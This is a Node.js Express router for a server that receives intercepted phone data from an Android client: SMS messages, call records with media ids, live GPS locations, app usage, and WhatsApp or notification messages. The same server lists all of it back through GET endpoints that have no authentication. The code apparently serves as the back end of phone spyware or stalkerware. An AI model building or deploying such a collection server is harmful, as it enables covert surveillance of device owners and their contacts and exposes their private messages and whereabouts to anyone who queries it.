const express = require('express');
const router = express.Router();

const Sms = require('../models/Sms');
const Call = require('../models/Call');
const Location = require('../models/Location');
const AppUsage = require('../models/AppUsage');
const Whatsapp = require('../models/Whatsapp');
const Device = require('../models/Device');

// helpers
function ensureDevice(deviceId) {
  return Device.findOneAndUpdate({ deviceId }, { $set: { lastSeen: new Date() } }, { upsert: false, new: true }).exec();
}

/**
 * Generic endpoints used by Android client
 */

// SMS
router.post('/sms', async (req, res) => {
  try {
    const { deviceId, sender, message, timestamp } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    const s = new Sms({ deviceId, sender, message, timestamp: timestamp ? new Date(timestamp) : new Date() });
    await s.save();
    await ensureDevice(deviceId);
    return res.json({ ok: true, sms: s });
  } catch (e) {
    console.error('sms err', e);
    return res.status(500).json({ error: 'internal' });
  }
});

// Call
router.post('/call', async (req, res) => {
  try {
    const { deviceId, number, type, state, timestamp, duration, mediaFileId } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    const c = new Call({ deviceId, number, type, state, timestamp: timestamp ? new Date(timestamp) : new Date(), duration, mediaFileId });
    await c.save();
    await ensureDevice(deviceId);
    return res.json({ ok: true, call: c });
  } catch (e) {
    console.error('call err', e);
    return res.status(500).json({ error: 'internal' });
  }
});

// Location
router.post('/location', async (req, res) => {
  try {
    const { deviceId, lat, lon, accuracy, timestamp } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    const l = new Location({ deviceId, lat, lon, accuracy, timestamp: timestamp ? new Date(timestamp) : new Date() });
    await l.save();
    // Emit realtime via socket.io (if present)
    if (req.app.locals.io) {
      const room = `device:${deviceId}`;
      req.app.locals.io.to(room).emit('location', {
        deviceId, lat, lon, accuracy, timestamp: l.timestamp || l.createdAt
      });
    }
    await ensureDevice(deviceId);
    return res.json({ ok: true, location: l });
  } catch (e) {
    console.error('location err', e);
    return res.status(500).json({ error: 'internal' });
  }
});

// App usage
router.post('/app-usage', async (req, res) => {
  try {
    const { deviceId, packageName, totalTime, lastTimeUsed } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    const a = new AppUsage({ deviceId, packageName, totalTime, lastTimeUsed: lastTimeUsed ? new Date(lastTimeUsed) : new Date() });
    await a.save();
    await ensureDevice(deviceId);
    return res.json({ ok: true, appUsage: a });
  } catch (e) {
    console.error('app-usage err', e);
    return res.status(500).json({ error: 'internal' });
  }
});

// Whatsapp / notifications
router.post('/whatsapp', async (req, res) => {
  try {
    const { deviceId, packageName, title, message, timestamp } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    const w = new Whatsapp({ deviceId, packageName, title, message, timestamp: timestamp ? new Date(timestamp) : new Date() });
    await w.save();
    await ensureDevice(deviceId);
    return res.json({ ok: true, whatsapp: w });
  } catch (e) {
    console.error('whatsapp err', e);
    return res.status(500).json({ error: 'internal' });
  }
});

/**
 * Listing endpoints (allow ?deviceId=...)
 */

// list sms
router.get('/sms', async (req, res) => {
  try {
    const q = {};
    if (req.query.deviceId) q.deviceId = req.query.deviceId;
    const items = await Sms.find(q).sort({ createdAt: -1 }).limit(200);
    res.json(items);
  } catch (e) { res.status(500).json({ error: 'internal' }); }
});

// list calls
router.get('/call', async (req, res) => {
  try {
    const q = {}; if (req.query.deviceId) q.deviceId = req.query.deviceId;
    const items = await Call.find(q).sort({ createdAt: -1 }).limit(200);
    res.json(items);
  } catch (e) { res.status(500).json({ error: 'internal' }); }
});

// list location
router.get('/location', async (req, res) => {
  try {
    const q = {}; if (req.query.deviceId) q.deviceId = req.query.deviceId;
    const items = await Location.find(q).sort({ timestamp: -1 }).limit(500);
    res.json(items);
  } catch (e) { res.status(500).json({ error: 'internal' }); }
});

// list app usage
router.get('/app-usage', async (req, res) => {
  try {
    const q = {}; if (req.query.deviceId) q.deviceId = req.query.deviceId;
    const items = await AppUsage.find(q).sort({ createdAt: -1 }).limit(500);
    res.json(items);
  } catch (e) { res.status(500).json({ error: 'internal' }); }
});

// list whatsapp
router.get('/whatsapp', async (req, res) => {
  try {
    const q = {}; if (req.query.deviceId) q.deviceId = req.query.deviceId;
    const items = await Whatsapp.find(q).sort({ createdAt: -1 }).limit(500);
    res.json(items);
  } catch (e) { res.status(500).json({ error: 'internal' }); }
});

module.exports = router;
